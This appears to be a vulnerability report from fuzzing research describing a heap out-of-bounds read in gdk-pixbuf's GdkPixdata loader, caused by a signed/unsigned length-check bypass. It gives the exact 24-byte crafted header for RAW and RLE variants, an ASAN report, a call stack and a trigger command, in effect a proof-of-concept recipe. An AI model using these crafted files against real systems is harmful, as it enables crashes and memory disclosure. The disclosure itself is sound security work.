# VULN-001: Heap OOB Read in gdk_pixbuf_from_pixdata()

## Summary

- **CWE**: CWE-125 Out-of-bounds Read
- **File**: `gdk-pixbuf/gdk-pixdata.c` lines 235, 459–495, ~505
- **Functions**: `gdk_pixdata_deserialize()` → `gdk_pixbuf_from_pixdata()`
- **Loader**: `io-pixdata.c` (GdkPixdata format, recognized by "GdkP" magic)
- **Trigger**: 24-byte GdkPixdata header-only blob (no pixel data bytes)

## Root Cause

### Step 1: Length check bypass (`gdk-pixdata.c` line 235)

```c
if (stream_length < pixdata->length - GDK_PIXDATA_HEADER_LENGTH)
    return_pixel_corrupt(error);
```

- `stream_length` is `guint` (unsigned)
- `pixdata->length` is `gint32` read from the header field
- `GDK_PIXDATA_HEADER_LENGTH` = 24

When the header's `length` field is set to 24 (= GDK_PIXDATA_HEADER_LENGTH):

`pixdata->length - GDK_PIXDATA_HEADER_LENGTH = 24 - 24 = 0 (gint32)`

C promotion rules convert this signed 0 to `0u` for comparison with `stream_length (guint)`.
The check becomes `stream_length < 0u` — always false. The size check is **bypassed**.

### Step 2: pixel_data pointer past end of input

```c
pixdata->pixel_data = (guint8 *)stream;  // stream = input_start + 24
```

For a 24-byte input, `stream` is now at `input_start + 24` — exactly past the end of
the allocated buffer.

### Step 3a: RAW encoding — single large memcpy (ASAN-verified)

```c
memcpy(data, pixdata->pixel_data, pixdata->rowstride * pixdata->height);
// = memcpy(output, pixel_data, 4 * 1000) = READ 4000 bytes from pixel_data
```

`pixel_data` starts 0 bytes past the end of the 128-byte GString buffer → ASAN
reports `heap-buffer-overflow: READ of size 4000`.

### Step 3b: RLE encoding — decode loop reads OOB (same bypass, behavioral evidence)

```c
const guint8 *rle_buffer = pixdata->pixel_data;  // past end of input
while (image_buffer < image_limit) {
    guint length = *(rle_buffer++);  // OOB READ: 1 byte
    ...
    rle_buffer += bpp;               // further OOB reads
}
```

The RLE loop reads heap bytes from beyond the input as RLE-encoded pixel data. The
`check_overrun` flag is set when garbage bytes produce output that overflows the
4000-byte output buffer, and the function returns NULL / "Image pixel data corrupt".
ASAN does not catch these 1–4 byte reads because GLib's GString allocates 128 bytes
for our 24-byte buffer, and the reads land within that allocation slack.

## Crafted Header (24 bytes, all fields big-endian)

| Field        | RAW variant | RLE variant | Notes                               |
|--------------|-------------|-------------|-------------------------------------|
| magic        | 0x47646b50  | 0x47646b50  | "GdkP" — detected by io-pixdata.c  |
| length       | 24          | 24          | = HEADER_LENGTH → bypasses check   |
| pixdata_type | 0x01010002  | 0x02010002  | RGBA + 8bit + RAW / RLE            |
| rowstride    | 4           | 4           | 1 pixel × 4 bytes; rowstride≥width |
| width        | 1           | 1           |                                     |
| height       | 1000        | 1000        | Large → large output buffer wanted |

pixdata_type breakdown:
- `GDK_PIXDATA_COLOR_TYPE_RGBA   = 0x02`
- `GDK_PIXDATA_SAMPLE_WIDTH_8   = 0x01 << 16 = 0x00010000`
- `GDK_PIXDATA_ENCODING_RAW     = 0x01 << 24 = 0x01000000` → type = `0x01010002`
- `GDK_PIXDATA_ENCODING_RLE     = 0x02 << 24 = 0x02000000` → type = `0x02010002`

## Call Stack (from ASAN report, RAW variant)

```
#0  __interceptor_memcpy
#1  gdk_pixbuf_from_pixdata         (gdk-pixdata.c)
#2  try_load                         (io-pixdata.c:83)
#3  pixdata_image_load_increment     (io-pixdata.c:152)
#4  generic_load_incrementally       (gdk-pixbuf-io.c)
#5  _gdk_pixbuf_generic_image_load
#6  gdk_pixbuf_new_from_file
#7  main                             (gdk-pixbuf-pixdata.c)
```

## ASAN Report (RAW variant)

```
==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50c000000840
READ of size 4000 at 0x50c000000840 thread T0
0x50c000000840 is located 0 bytes to the right of 128-byte region
[0x50c0000007c0, 0x50c000000840)
allocated by thread T0:
    g_realloc → generic_load_incrementally → _gdk_pixbuf_generic_image_load
```

## Trigger Command

```bash
LD_LIBRARY_PATH=/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/lib \
ASAN_OPTIONS=detect_leaks=0 \
  /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata \
  vuln_001.pixdata /tmp/out.dat
```

## Files

- `vuln_001.pixdata` — 24-byte blob, RAW encoding, ASAN-verified crash
- `vuln_001_rle.pixdata` — 24-byte blob, RLE encoding, behavioral trigger
